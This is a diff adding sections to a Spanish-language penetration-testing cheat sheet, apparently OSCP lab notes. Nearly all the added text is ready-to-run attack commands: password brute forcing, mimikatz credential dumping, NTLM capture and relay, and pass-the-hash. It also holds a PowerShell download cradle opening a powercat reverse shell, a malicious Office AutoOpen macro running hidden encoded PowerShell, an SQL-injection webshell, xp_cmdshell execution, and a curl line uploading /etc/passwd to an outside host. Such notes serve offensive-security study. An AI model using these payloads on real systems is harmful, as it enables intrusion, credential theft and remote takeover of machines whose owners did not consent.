@@ -9,6 +9,7 @@
 - [Post-Explotación (persistencia)](#persistencia)
 - [Post-Explotación (escalada de privilegios)](#escalacion-privilegios)
 - [Pivoting](#pivoting)
+- [Evasion de antivirus](#antivirus)
 - [Exfiltración de datos](#exfiltracion)
 - [Limpiando huellas](#limpiar-huellas)
 
@@ -43,8 +44,10 @@ nslookup -type=TXT info.megacorptwo.com 192.168.50.151
 
 ## TCP/UDP
 
+```sh
 nc -nvv -w 1 -z 192.168.50.152 3388-3390
 nc -nv -u -z -w 1 192.168.50.149 120-123
+```
 
 ### Powershell
 
@@ -55,22 +58,143 @@ Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$
 ```
 
 ## SMB
-
+```sh
 sudo nbtscan -r 192.168.50.0/24
+```
+# Password Attacks
+
+## SSH 
+```sh
+sudo hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
+```
+Aqui hay que tomar en cuenta el valor del $6 para ver cuál hace match en hashcat
+```sh
+hashcat -h | grep -i "ssh"
+ssh2john id_rsa > ssh.hash
+
+hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
+```
+Es posible que hashcat tire un error, para eso podemos usar john
+En caso de que tengamos un custom rule:
+```sh
+$ cat ssh.rule
+c $1 $3 $7 $!
+c $1 $3 $7 $@
+c $1 $3 $7 $#
+$ sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'
+
+john --wordlist=ssh.passwords --rules=sshRules ssh.hash
+```
+## RDP
+```sh
+sudo hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
+```
+## HTTP
+```sh
+sudo hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
+```
+## Keepass
+```sh
+keepass2john Database.kdbx > keepass.hash 
+hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
+```
+## Contraseñas de windows
+
+Primero localizar cuales usuarios hay y correr mimikatz, recordar que se ocupa admin
+```cmd
+Get-LocalUser
+.\mimikatz.exe
+```
+Trata de recuperar contraseñas
+```cmd
+sekurlsa::logonpasswords
+```
+Trata de recuperar NTLM hashes
+```cmd
+lsadump::sam
+```
+Algunos comandos como estos ocupan priivlegios elevados, es por eso que debemos utilizar 
+```cmd
+token::elevate
+
+mimikatz # privilege::debug
+Privilege '20' OK
+mimikatz # token::elevate
+Token Id : 0
+User name :
+SID name : NT AUTHORITY\SYSTEM
+656 {0;000003e7} 1 D 34811 NT AUTHORITY\SYSTEM S-1-5-18 
+(04g,21p) Primary
+-> Impersonated !
+* Process Token : {0;000413a0} 1 F 6146616 MARKETINGWK01\offsec S-1-5-21-
+4264639230-2296035194-3358247000-1001 (14g,24p) Primary
+* Thread Token : {0;000003e7} 1 D 6217216 NT AUTHORITY\SYSTEM S-1-5-18 
+(04g,21p) Impersonation (Delegation)
+mimikatz # lsadump::sam
+Domain : MARKETINGWK01
+SysKey : 2a0e15573f9ce6cdd6a1c62d222035d5
+Local SID : S-1-5-21-4264639230-2296035194-3358247000
+RID : 000003e9 (1001)
+User : offsec
+ Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
+RID : 000003ea (1002)
+User : nelly
+ Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10
+```
+## NTLM
+```sh
+hashcat --help | grep -i "ntlm" 
+hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+## NTLMv2
+```cmd
+nc 192.168.50.211 4444
+C:\Windows\system32> whoami
+whoami
+files01\paul
+
+net user paul
+```
+Revisar si está en el grupo de RDP
+```cmd
+Local Group Memberships *Remote Desktop Users *Users
+```
+Desde nuestra máquina lanzamos el responder con la interfaz de SMB habilitado
+```sh
+ip a
+sudo responder -I tap0
+```
+Desde la máquina victima intentar acceder a un share
+```cmd
+dir \\192.168.119.2\test
+```
+Y desde el responder deberíamos de encontrar el hash
+```cmd
+[+] Listening for events... 
+[SMB] NTLMv2-SSP Client : ::ffff:192.168.50.211
+[SMB] NTLMv2-SSP Username : FILES01\paul
+[SMB] NTLMv2-SSP Hash : 
+paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050
+CD1777D801B7585DF5719ACFBA0000000....00
+```
+```sh
+hashcat --help | grep -i "ntlm"
+hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
+```
 
 # Enumeracion
-
+```sh
 sudo nmap --script-updatedb
 sudo nmap -p- --open -vvv --min-rate 5000 -sS -Pn 10.10.10.4 -oN nmap
 sudo nmap -sVC -p135,139,445 10.10.10.4 -oN nmap.service
- sudo nmap -sV -p 443 --script "vuln" 192.168.50.124
-
+sudo nmap -sV -p 443 --script "vuln" 192.168.50.124
+```
 ## Directorios
-
+```sh
 gobuster dir -u [URL] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 500 
 
 -w /usr/share/wordlists/dirb/common.txt  
-
+```
 ## Tools
 
 ### Git
@@ -179,13 +303,18 @@ hashcat -m 1000 -a 0 -o output.txt --remove hashes.txt /usr/share/wordlists/rock
 
 
 wget
-```
+```sh
 wget -O exploit.c 10.10.10.10/exploit.c
 ```
 
 Curl Upload
-```
+```cmd
 curl --upload-file /etc/passwd http://10.10.10.10
+```
+
+## Descargar desde powershell
+```cmd
+EX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
 ```
 
 ## TFTP
@@ -300,6 +429,175 @@ http://1.1.1.1/backdoor.php?cmd=%22nc.exe%20-vn%2010.10.10.10%207777%20-e%20cmd.
 
 # Explotación
 
+## Macros
+
+Pasar esto a base64
+```sh
+IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
+```
+Convertir este base64 en chunks de 50 caracteres 
+
+```py
+str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."
+n = 50
+for i in range(0, len(str), n):
+    print("Str = Str + " + '"' + str[i:i+n] + '"')
+```
+Pegarlo en el macro
+```sh
+Sub AutoOpen()
+ MyMacro
+End Sub
+Sub Document_Open()
+ MyMacro
+End Sub
+Sub MyMacro()
+ Dim Str As String
+ 
+ Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
+ Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
+ Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
+ ...
+ Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
+ Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
+ Str = Str + "A== "
+ CreateObject("Wscript.Shell").Run Str
+End Sub
+```
+Esperar conexión
+
+```sh
+nc -nvlp 4444
+```
+
+## MYSQL
+```sql
+mysql -u root -p'root' -h 192.168.50.16 -P 3306
+select version();
+select system_user();
+show databases;
+SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
+```
+## MSSQL
+
+```sql
+SELECT @@version;
+SELECT name FROM sys.databases;
+select * from offsec.dbo.users;
+SELECT * FROM offsec.information_schema.tables;
+
+impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
+```
+
+## SQLMAP
+```sh
+sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump
+sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp" 
+```
+### Code Execution
+
+```sql
+SQL> EXECUTE sp_configure 'show advanced options', 1;
+[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' 
+changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL> RECONFIGURE;
+SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
+[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 
+0 to 1. Run the RECONFIGURE statement to install.
+SQL> RECONFIGURE;
+SQL> EXECUTE xp_cmdshell 'whoami';
+output
+--------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------
+nt service\mssql$sqlexpress
+NULL
+```
+```sql
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
+```
+
+## Windows Library Files
+
+### Dependencias 
+
+```sh
+pip3 install wsgidav 
+```
+
+Nos permite compartir un directorio compartido WebDAV 
+
+```sh
+/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
+```
+
+Para crear la librería se utilizará `xfreerdp`
+
+Vamos a crear un archivo con nuestro propia ip 
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation>
+<url>http://192.168.119.2</url>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+</libraryDescription>
+```
+
+## Pass the hash
+
+Esto nos permite ver cuáles archivos podemos acceder con el hash
+```cmd
+smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
+get file.txt
+```
+En este caso vamos a obtener un shell interactivo, psexec tratará de buscar un share con permisos de escritura, sube un ejecutable, lo registra como un servicio y lo inicia.
+```sh
+impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
+```
+Otro tool puede ser
+```sh
+impacket-wmiexec -hashes  00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
+```
+## Net-NTLMv2 Relay
+
+La base64 es un rev shell 
+```sh
+sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
+```
+Abrimos el puerto en escucha 
+```sh
+nc -nvlp 8080
+```
+Nos conectamos a la maquina
+```cmd
+nc 192.168.50.211 5555 
+C:\Windows\system32>whoami
+whoami
+files01\files02admin
+C:\Windows\system32>dir \\192.168.119.2\test
+[*] SMBD-Thread-4: Received connection from 192.168.50.211, attacking target 
+smb://192.168.50.212
+[*] Authenticating against smb://192.168.50.212 as FILES01/FILES02ADMIN SUCCEED
+[*] SMBD-Thread-6: Connection from 192.168.50.211 controlled, but there are no more 
+targets left!
+...
+[*] Executed specified command on host: 192.168.50.212
+```
+Ya con esto deberíamos ser capaces de obtener root en la maquina
 
 # Post-Explotación (persistencia)
 ```sh
@@ -649,10 +947,63 @@ Recuerde encodearlo
 
 # Exfiltración de datos
 
+# Evasion de antivirus
+
+## Teoria pequeña
+
+- File Engine
+
+Responsible for both scheduled and real-time file scans.
+When the engine performs a scheduled scan, it simply parses the entire file system and sends each file’s metadata or data to the signature engine. On the contrary, real-time scans involve detecting and possibly reacting to any new file action, such as downloading new malware from a website.
+
+- Memory Engine
+
+Inspects each process’s memory space at runtime for well-known binary signatures or suspicious API calls that might result in memory injection attacks
+
+- Network Engine
+
+Inspects the incoming and outgoing network traffic on the local network interface
+
+- Disassembler
+
+Is responsible for translating machine code into assembly language, reconstructing the original program code section, and identifying any encoding/decoding routine. 
+
+- Emulator/Sandbox
+
+Special isolated environment in the AV software where malware can be safely loaded and executed without causing potential havoc to the system
+
+- Browser Plugin
+
+Modern AVs often employ browser plugins to get better visibility and detect malicious content that might be executed inside the browser.
+
+- Machine Learning Engin
+
+It enables detection of unknown threats by relying on cloud-enhanced computing resources and algorithms.
+
+### Detection Methods
+
+- Signature-based Detection
+
+Is mostly considered a restricted list technology. In other words, the filesystem is scanned for known malware signatures and if any are detected, the offending files are quarantined.
+
+- Heuristic-based Detection
+
+Is a detection method that relies on various rules and algorithms to determine whether or not an action is considered malicious. The idea is to search for various patterns and program calls
+
+- Behavioral Detection
+
+Dynamically analyzes the behavior of a binary file. This is often achieved by executing the file in question in an emulated environment, such as a small virtual machine, and searching for behaviors or actions that are considered malicious
+
+- Machine Learning Detection
+
+Aims to up the game by introducing ML algorithms to detect 
+unknown threats by collecting and analyzing additional metadata.
+
 
 # Limpiando huellas
 
 # Tips
+
 
 script /dev/null -c bash
 ctrl Z
@@ -661,3 +1012,7 @@ reset xterm
 export TERM=xterm-256color
 export SHELL=bash
 source /etc/skel/.bashrc
+
+
+
+exiftool -a -u brochure.pdf
